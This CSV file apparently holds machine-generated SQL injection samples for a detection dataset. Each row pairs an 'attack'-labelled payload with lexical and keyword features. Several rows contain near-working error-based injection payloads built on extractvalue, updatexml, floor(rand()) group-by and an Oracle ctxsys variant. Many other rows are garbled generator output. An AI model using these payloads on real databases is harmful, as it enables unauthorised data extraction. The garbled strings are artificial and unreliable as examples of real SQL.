label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"-59671\chr' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 't_hr.g  (  as L FROMu  byL else 4607   9627 8488 AND end  rand  case   ,1 3931 concat  =  ,0x78)i     )    8190     (  )  #,  0  rand",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,294,336.0,49.0,4.173337914655429,117.0,66.0,119.0,34.0,0.3482142857142857,0.19642857142857142,0.3541666666666667,0.10119047619047619,2.0,0.0,1.0,0.0,0.0,2.0,0.0,17.0,0.0,1.0,8.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1v' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'ljwvw;      (  ||hr  (  6055  ||chr  (  ||cst_r.gsxr.(  select dhr  (  =  )   or x 5584 E  )     ),0x717a767a71    )   a LIA.1 group where end   FROM  )   2131 4232  au   =  )    )   xunion ||hr  )  (  =  #,1   x. A from from union else O- select)   x and  || where m when   (  ||chr(  (  0  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,295,590.0,54.0,4.167702490822889,210.0,83.0,222.0,75.0,0.3559322033898305,0.14067796610169492,0.376271186440678,0.1271186440677966,2.0,0.0,1.0,0.0,2.0,4.0,1.0,38.0,0.0,1.0,8.0,20.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,8.0,4.0,2.0,4.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0
attack,"1%floor""  *2,  )   then and s       )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,296,40.0,20.0,3.295461844238322,13.0,2.0,18.0,7.0,0.325,0.05,0.45,0.175,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"11""_natualasauncoyerog_zy  eroadettys..r  (  =  ,floorh  rand  113 0,1   ax else  113  )   x by FROM D end  ) 4493)   then by by by 1 ANDAND 1x  x   select concat  (  =  ||chr  (  *)   )   where chr  112  ||chocp.gsxr_amaop  ycconcat  (  (      chr  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,297,253.0,44.0,4.2473206122872025,124.0,19.0,83.0,27.0,0.4901185770750988,0.07509881422924901,0.32806324110671936,0.1067193675889328,0.0,1.0,0.0,0.0,1.0,2.0,0.0,11.0,0.0,3.0,2.0,7.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1 etyssgsxet_o,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,298,14.0,10.0,3.1820058147602133,11.0,1.0,1.0,1.0,0.7857142857142857,0.07142857142857142,0.07142857142857142,0.07142857142857142,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'turt_tyxu"" like ""ljm   4493'  =  'chryv.ws a 5584 1 end  )   )    )    )   then D AINCMSTRAS 1 by DT where from 0x5c  =  6055 or by DI.UM  0 SELECT by 1 D else m whenIhr  (  *  ||  113  casec  (  edl.  (  =  =      (  )   then1 1392 s  select by,1 8382  )     )  =  *2   )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,299,451.0,55.0,4.115393409234995,145.0,67.0,185.0,54.0,0.3215077605321508,0.14855875831485588,0.41019955654101997,0.1197339246119734,4.0,2.0,0.0,0.0,2.0,6.0,0.0,28.0,0.0,1.0,6.0,10.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"-3775case 7881 ||  (  (   6237  ||chr  (  113  0  randhr  case 1 end  a else from   (  select when where 3074  1297,  (  4232  )  || end  =  ,  )   )     )     concat  select 8488 AA )||chr  (  adt_ar.r  (  )   fromI  )    (  )     SELECT r.chr  (  =  )   or    SELECT or or  end  (  select DASNT IS_r  =  )   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,300,310.0,42.0,3.94305231101493,114.0,33.0,125.0,38.0,0.36774193548387096,0.1064516129032258,0.4032258064516129,0.12258064516129032,0.0,0.0,1.0,0.0,0.0,3.0,0.0,20.0,0.0,2.0,2.0,12.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,5.0,0.0,1.0,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1""  )   )  || end   or extractvalue  select I. select 1x  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,301,60.0,21.0,3.6756925587058804,31.0,2.0,19.0,8.0,0.5166666666666667,0.03333333333333333,0.31666666666666665,0.13333333333333333,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-6237c5305xtlinadq    )    x m 0yg AS endn information_schema.v  )  ||,  =  select T7562  *2   )    )     )   )     then # 7881  (  )   )   (  )    )   x x        )    )   x   :from end  ,  ||chr  (  hr  =  =     c me 5584 1 4493  =.achroaer  (  =  6237,1    select DISCn_s 7158  =  4232  )   3785 x",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,302,299.0,47.0,3.9082255143446725,87.0,44.0,130.0,38.0,0.2909698996655518,0.14715719063545152,0.43478260869565216,0.12709030100334448,0.0,0.0,1.0,0.0,1.0,6.0,0.0,17.0,0.0,2.0,3.0,12.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   '9891(  ,floor  rand  =  case by  ,,7469  ||chr  (  =  case 0 ||  (  case when 4386  case||chr  ||chount_adhhrx.echr  (    or (    s   xfr  _2 AND fromu,concat  )     ),     )  )   )   )   WHERE 1     select end    )   )     )  )   (  (  4510eau'  (  (  (  )   || 5856  ||chr  (  )  6270   or  by",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,303,465.0,45.0,3.866253818771907,134.0,66.0,196.0,69.0,0.28817204301075267,0.14193548387096774,0.421505376344086,0.14838709677419354,3.0,0.0,0.0,0.0,0.0,3.0,0.0,37.0,0.0,2.0,11.0,15.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'Yn122ax3074",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,304,190.0,29.0,3.48975318621491,43.0,42.0,81.0,24.0,0.22631578947368422,0.22105263157894736,0.4263157894736842,0.12631578947368421,2.0,0.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1jIqf,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,305,5.0,5.0,2.321928094887362,4.0,1.0,0.0,0.0,0.8,0.2,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""  =  ""l",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,306,10.0,6.0,2.321928094887362,1.0,1.0,4.0,4.0,0.1,0.1,0.4,0.4,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%concat'||  (  select '.s   )     or RE  ||chr  =  ,  ||(  =  select AND WHERE union dchr  113  113  ,concat  )  *   xxuamn   )    )     9067)  un||ICtr.ger  (  ||chr   concat  6082  (  >  (  0  case when   (  select select   then 1 R 3785 when   x ,concat  6055  113  ||selectnx.chhr  (  4232  0  *2.)  # when   x.(  )  ||c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,307,325.0,48.0,4.122263049755974,127.0,34.0,118.0,46.0,0.39076923076923076,0.10461538461538461,0.3630769230769231,0.14153846153846153,2.0,0.0,0.0,0.0,2.0,2.0,0.0,15.0,1.0,0.0,3.0,19.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,4.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,"1NyuBnatoereras.gdbt_et when  =  select  m   )    ,0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,308,63.0,30.0,4.276053385567636,34.0,10.0,14.0,5.0,0.5396825396825397,0.15873015873015872,0.2222222222222222,0.07936507936507936,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1'  a_)    or 1 E   )    --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,309,27.0,10.0,2.3621705046031805,4.0,2.0,15.0,6.0,0.14814814814814814,0.07407407407407407,0.5555555555555556,0.2222222222222222,1.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1t%y.113  (  ,concat  SELECT I 1210  =  ,concat  4232  u   ,  ||chThr  (  6237,floor  selectI  =  )   then 3051 1 when   (    )   and   --ruadr.(  ,   (  ||  (  >  select fromhr  (  =  = 6913 RNUkIT end  )   then else select end  ||schr  (hr  (  0  ||  (  ||r  (  (  select or  D union 1   then x DISM",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,310,301.0,49.0,4.126978154432238,123.0,27.0,111.0,40.0,0.40863787375415284,0.08970099667774087,0.3687707641196013,0.132890365448505,0.0,0.0,2.0,0.0,0.0,4.0,0.0,15.0,1.0,0.0,5.0,17.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,4.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%a' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'nllnzn   )        4510,  (  )  ||chr  (  ,  =  )    )    *    (  (  ,floor  )   or ,concat  113  *,ix  )     and    FROM union 1 1x 7881 FROM xM u or (  t113  )  )    select  union Du)        )u(  ,  || dr  (  0 fromAND)      xu   x  =  0  a   )    )    )  ||chr  112  )     )   then union ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,311,1150.0,52.0,3.9051308232800275,387.0,144.0,475.0,144.0,0.33652173913043476,0.12521739130434784,0.41304347826086957,0.12521739130434784,4.0,2.0,0.0,0.0,8.0,5.0,0.0,87.0,3.0,4.0,22.0,20.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,13.0,6.0,0.0,7.0,5.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,41.0
attack,"1""  =  ""ay",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,312,10.0,6.0,2.321928094887362,2.0,1.0,4.0,3.0,0.2,0.1,0.4,0.3,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%<' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,313,181.0,33.0,3.9322819627490775,46.0,47.0,63.0,25.0,0.2541436464088398,0.2596685082872928,0.34806629834254144,0.13812154696132597,2.0,0.0,0.0,0.0,0.0,2.0,0.0,11.0,1.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""3775xveynaladtyslyzwodu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'' like '"" like ""su",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,314,544.0,40.0,3.950853676406177,151.0,99.0,209.0,85.0,0.2775735294117647,0.18198529411764705,0.38419117647058826,0.15625,4.0,4.0,0.0,0.0,0.0,4.0,0.0,41.0,1.0,0.0,7.0,26.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1""0x717a767a71neuar",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,315,19.0,11.0,3.1363793303507563,8.0,10.0,0.0,1.0,0.42105263157894735,0.5263157894736842,0.0,0.05263157894736842,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'Atxyusww",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,316,187.0,29.0,3.495390903448332,47.0,35.0,81.0,24.0,0.25133689839572193,0.18716577540106952,0.43315508021390375,0.12834224598930483,2.0,0.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1x' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'f5305' like 'f",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,317,312.0,38.0,4.047018228779474,108.0,59.0,111.0,34.0,0.34615384615384615,0.1891025641025641,0.3557692307692308,0.10897435897435898,4.0,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1% ' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'o'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,318,269.0,36.0,3.976148416514086,101.0,35.0,98.0,35.0,0.3754646840148699,0.13011152416356878,0.3643122676579926,0.13011152416356878,4.0,0.0,0.0,0.0,2.0,2.0,0.0,18.0,1.0,2.0,5.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,-5967 1 d  : x   group 3931 end  caseOt_as.Nserasselect   (  Rasss Iwr.Um 1x 1 by select information_schemax. INCkkNAWconcatNThrhrhrhearrr,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,319,138.0,43.0,4.717214997446816,95.0,11.0,24.0,8.0,0.6884057971014492,0.07971014492753623,0.17391304347826086,0.057971014492753624,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1' 5584 e I else when   where 9173 * || concat  )  select when unionun else chr  (  ||ounuin   or extractvalue    4232  caseANDayxl_t  (  (  0x7171706a71  )  )     )   a 7158  )     or or 4493  #u   =  7469  =  )     )  )     0x717a767a71,1 concat  4232  4232  4232  )   from _ or D end  )     WHERE by 3785 7158  (i,floor  rand  113  chr  (  case   u2   ||c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,320,358.0,48.0,4.187313567952642,130.0,69.0,129.0,30.0,0.36312849162011174,0.19273743016759776,0.36033519553072624,0.08379888268156424,1.0,0.0,0.0,0.0,1.0,2.0,0.0,15.0,0.0,2.0,2.0,9.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,2.0,1.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   """"  =  ""       x. 5192 group by end  )   then group 0 concat  (  4232  case 1210  from x end  )   then 1 0 end  ,0x717a767a71,floor    case when   (  (  =  5023  )  ||chr  (   SELECT concat  113  6825   )    )     )     )   SELECT by   )    )   )    6082  ,0x717a767a71,floor  rand  ||chrhr  =u  4232  ,     ,  )  ,1   from 1210  )    (  1045   '+  (  select ' then m)   )     ,6 dr  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,321,553.0,46.0,3.8816801176526274,159.0,97.0,234.0,63.0,0.2875226039783002,0.17540687160940324,0.4231464737793852,0.11392405063291139,2.0,4.0,0.0,0.0,0.0,4.0,0.0,34.0,0.0,0.0,13.0,9.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
